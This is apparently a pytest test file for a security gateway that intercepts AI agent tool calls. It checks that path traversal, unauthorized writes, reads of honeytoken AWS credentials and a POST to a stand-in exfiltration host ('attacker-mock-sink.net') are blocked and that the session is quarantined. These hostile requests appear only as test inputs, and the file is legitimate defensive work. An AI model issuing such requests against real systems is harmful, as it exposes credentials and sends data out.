"""
Unit and Integration Tests for Stage 2 Security Core.
Verifies that unauthorized operations are strictly intercepted and blocked before execution.
"""

import pytest
import uuid
from sqlalchemy import create_engine
from sqlalchemy.orm import sessionmaker

from app.core.database import Base
from app.models.agent import AgentModel, PolicyManifestModel
from app.models.event import SecurityEventModel
from app.models.incident import IncidentModel
from app.agent.environment import synthetic_env
from app.security.gateway import gateway
from app.security.policy_engine import policy_engine
from app.security.rule_detector import rule_detector
from app.security.correlation_engine import correlation_engine
from app.schemas.event import ToolCallRequest

@pytest.fixture
def db_session():
    """In-memory SQLite session for isolated, rapid testing."""
    test_engine = create_engine("sqlite:///:memory:")
    Base.metadata.create_all(bind=test_engine)
    TestingSession = sessionmaker(autocommit=False, autoflush=False, bind=test_engine)
    db = TestingSession()
    gateway.set_correlation_engine(correlation_engine)
    yield db
    db.close()

@pytest.fixture
def test_agent_and_policy(db_session):
    """Sets up a controlled researcher agent with least-privilege permissions."""
    agent_id = "agent_researcher_001"
    agent = AgentModel(
        agent_id=agent_id,
        name="Research Analyst Agent",
        role="Summarizer",
        authorized_objective="Summarize public company annual reports and compute basic statistics."
    )
    policy = PolicyManifestModel(
        policy_id=str(uuid.uuid4()),
        agent_id=agent_id,
        version="1.0",
        allowed_tools=["document_reader", "calculator"],
        allowed_paths=["public/*"],
        denied_paths=["credentials/*", "private/*"],
        allowed_network_domains=["api.internal.mock"],
        allowed_operations=["READ", "CALCULATE"],
        require_approval_operations=["WRITE"],
        max_denial_threshold=3
    )
    db_session.add(agent)
    db_session.add(policy)
    db_session.commit()
    return agent_id

def test_sandbox_path_traversal_protection():
    """Verifies that synthetic sandbox blocks directory traversal attempts."""
    # Benign path resolves safely
    resolved = synthetic_env.resolve_sandbox_path("public/annual_report_2025.txt")
    assert resolved.exists()
    assert resolved.name == "annual_report_2025.txt"

    # Directory traversal attempts must raise PermissionError
    with pytest.raises(PermissionError):
        synthetic_env.resolve_sandbox_path("../../etc/passwd")

    with pytest.raises(PermissionError):
        synthetic_env.resolve_sandbox_path("..\\..\\windows\\system32")

def test_benign_authorized_tool_execution(db_session, test_agent_and_policy):
    """Verifies that an authorized tool call is allowed and executes properly."""
    session_id = str(uuid.uuid4())
    req = ToolCallRequest(
        agent_id=test_agent_and_policy,
        session_id=session_id,
        task_id="task_summarize_2025",
        tool_name="document_reader",
        parameters={"path": "public/annual_report_2025.txt"}
    )
    resp = gateway.dispatch_tool_call(db=db_session, request=req)

    assert resp.policy_decision == "ALLOW"
    assert resp.execution_status == "EXECUTED"
    assert "Acme Corp Annual Report 2025" in resp.output["content"]

    # Verify event stored in DB
    event = db_session.query(SecurityEventModel).filter(SecurityEventModel.event_id == resp.event_id).first()
    assert event is not None
    assert event.action_type == "TOOL_CALL_ALLOWED"
    assert event.policy_decision == "ALLOW"

def test_unauthorized_tool_blocked_before_execution(db_session, test_agent_and_policy):
    """Verifies that attempting an unauthorized tool (e.g. filesystem_write) is blocked."""
    session_id = str(uuid.uuid4())
    req = ToolCallRequest(
        agent_id=test_agent_and_policy,
        session_id=session_id,
        task_id="task_write_attempt",
        tool_name="filesystem_write",
        parameters={"path": "output/hacked.txt", "content": "malicious payload"}
    )
    resp = gateway.dispatch_tool_call(db=db_session, request=req)

    assert resp.policy_decision == "DENY"
    assert resp.execution_status == "BLOCKED"
    assert "not in authorized tool whitelist" in resp.decision_reason
    assert resp.output is None

    # Verify target file was NEVER created on disk
    target_file = synthetic_env.root / "output" / "hacked.txt"
    assert not target_file.exists()

def test_credential_access_blocked_and_triggers_rule_b(db_session, test_agent_and_policy):
    """Verifies that access to simulated honeytoken credentials is blocked and triggers Rule B."""
    session_id = str(uuid.uuid4())
    req = ToolCallRequest(
        agent_id=test_agent_and_policy,
        session_id=session_id,
        task_id="task_credential_harvest",
        tool_name="document_reader",
        parameters={"path": "credentials/aws_keys.env"}
    )
    resp = gateway.dispatch_tool_call(db=db_session, request=req)

    assert resp.policy_decision == "DENY"
    assert resp.execution_status == "BLOCKED"
    assert "SENSITIVE_CREDENTIAL_ACCESS" in resp.risk_indicators
    assert resp.output is None

    # Verify incident was created and links to this event
    incident = db_session.query(IncidentModel).filter(IncidentModel.session_id == session_id).first()
    assert incident is not None
    assert incident.primary_threat_category == "CREDENTIAL_THEFT"
    assert incident.severity == "CRITICAL"
    assert resp.event_id in incident.evidence_event_ids
    assert incident.mitigation_status == "BLOCKED_AT_GATEWAY"

def test_unapproved_destination_blocked_and_triggers_rule_c(db_session, test_agent_and_policy):
    """Verifies that attempting to communicate with unapproved network destination is blocked."""
    # Give agent mock_api_request tool but restrict domain
    policy = db_session.query(PolicyManifestModel).filter(
        PolicyManifestModel.agent_id == test_agent_and_policy
    ).first()
    policy.allowed_tools = ["document_reader", "mock_api_request"]
    db_session.commit()

    session_id = str(uuid.uuid4())
    req = ToolCallRequest(
        agent_id=test_agent_and_policy,
        session_id=session_id,
        task_id="task_exfil",
        tool_name="mock_api_request",
        parameters={
            "method": "POST",
            "url": "https://attacker-mock-sink.net/exfil",
            "body": {"leak": "stolen"}
        }
    )
    resp = gateway.dispatch_tool_call(db=db_session, request=req)

    assert resp.policy_decision == "DENY"
    assert resp.execution_status == "BLOCKED"
    assert "DATA_EXFILTRATION_RISK" in resp.risk_indicators

    incident = db_session.query(IncidentModel).filter(IncidentModel.session_id == session_id).first()
    assert incident is not None
    assert incident.primary_threat_category == "DATA_EXFILTRATION"

def test_repeated_denials_quarantine_session(db_session, test_agent_and_policy):
    """Verifies that exceeding max denial threshold (3) locks down the session."""
    session_id = str(uuid.uuid4())

    # Trigger 3 denials
    for i in range(3):
        req = ToolCallRequest(
            agent_id=test_agent_and_policy,
            session_id=session_id,
            task_id=f"task_denial_{i}",
            tool_name="document_reader",
            parameters={"path": "credentials/aws_keys.env"}
        )
        resp = gateway.dispatch_tool_call(db=db_session, request=req)
        assert resp.policy_decision == "DENY"

    # 4th request (even for an allowed document!) should be quarantined
    req_quarantine = ToolCallRequest(
        agent_id=test_agent_and_policy,
        session_id=session_id,
        task_id="task_after_lockout",
        tool_name="document_reader",
        parameters={"path": "public/annual_report_2025.txt"}
    )
    resp_quarantine = gateway.dispatch_tool_call(db=db_session, request=req_quarantine)

    assert resp_quarantine.policy_decision == "DENY"
    assert "SESSION_QUARANTINED" in resp_quarantine.risk_indicators or "SESSION_LOCKED" in resp_quarantine.risk_indicators
    assert "exceeded threshold" in resp_quarantine.decision_reason
